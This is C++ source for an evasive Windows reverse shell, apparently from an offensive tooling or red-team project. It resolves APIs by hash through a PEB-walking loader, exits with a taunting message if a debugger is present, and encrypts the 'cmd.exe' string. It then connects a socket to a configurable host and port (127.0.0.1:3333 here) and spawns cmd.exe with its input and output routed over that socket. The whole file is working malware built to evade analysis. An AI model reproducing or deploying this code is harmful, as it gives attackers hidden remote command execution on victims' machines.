#include <iostream>
#include <type_traits>


#include <WinSock2.h>
#include <Windows.h>

#include "prng.h"
#include "loader.h"


#define HOST "127.0.0.1"
#define PORT 3333




WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

//https://stackoverflow.com/questions/14294271/forcing-a-constant-expression-to-be-evaluated-during-compile-time
#define COMPILATION_EVAL(e) (std::integral_constant<decltype(e), e>::value)

#define f(STR) h(e(STR).c_str())

#define g(STR) xxh32_consteval(STR,0)


int main()
{
	Loader ldr(imports);

	BOOL debugged = ldr.call_stdcall<BOOL>(g("IsDebuggerPresent"));

	if (debugged) {
		ldr.call_stdcall<int, HWND, LPCSTR, LPCSTR, UINT>(g("MessageBoxA"), NULL, "I know what you are trying to do.", "Success", MB_OK);
		return 0;
	}

	ldr.call_stdcall<int, HWND, LPCSTR, LPCSTR, UINT>(g("MessageBoxA"), NULL, "PEB walk success", "Success", MB_OK);


	//// init socket lib
	ldr.call_stdcall<int, WORD, LPWSADATA>(g("WSAStartup"), MAKEWORD(2, 2), &wsaData);


	//// create socket
	//wSock = pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
	wSock = ldr.call_stdcall<SOCKET, int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD>(g("WSASocketW"),
		AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL
	);


	hax.sin_family = AF_INET;
	hax.sin_port = ldr.call_stdcall<u_short, u_short>(g("htons"),PORT);
	hax.sin_addr.s_addr = ldr.call_stdcall<unsigned long,const char*>(g("inet_addr"), HOST);

	//// connect to remote host
	ldr.call_stdcall<int, SOCKET, const SOCKADDR*, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS>(g("WSAConnect"),
		wSock, (sockaddr*)&hax, sizeof(hax), NULL, NULL, NULL, NULL
	);

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = STARTF_USESTDHANDLES;
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;


	wchar_t proc[8];
	wcscpy_s(proc, 8, make_encrypted_wstring(L"cmd.exe").c_str());
	ldr.call_stdcall<BOOL, LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION>(g("CreateProcessW"),
		NULL, proc, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi
		);
	
	
	exit(0);
}